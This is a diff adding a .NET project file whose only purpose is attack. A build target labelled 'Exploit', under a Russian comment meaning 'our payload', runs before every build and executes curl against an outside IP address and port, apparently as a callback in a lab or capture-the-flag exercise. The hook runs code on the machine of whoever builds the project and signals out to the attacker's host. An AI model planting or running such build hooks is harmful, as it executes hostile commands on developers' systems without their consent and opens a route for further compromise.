@@ -1,0 +1,11 @@
+<Project Sdk="Microsoft.NET.Sdk">
+  <PropertyGroup>
+    <OutputType>Exe</OutputType>
+    <TargetFramework>net6.0</TargetFramework>
+  </PropertyGroup>
+
+  <!-- Наш payload -->
+  <Target Name="Exploit" BeforeTargets="Build">
+    <Exec Command="curl http://10.10.16.21:1337" />
+  </Target>
+</Project>
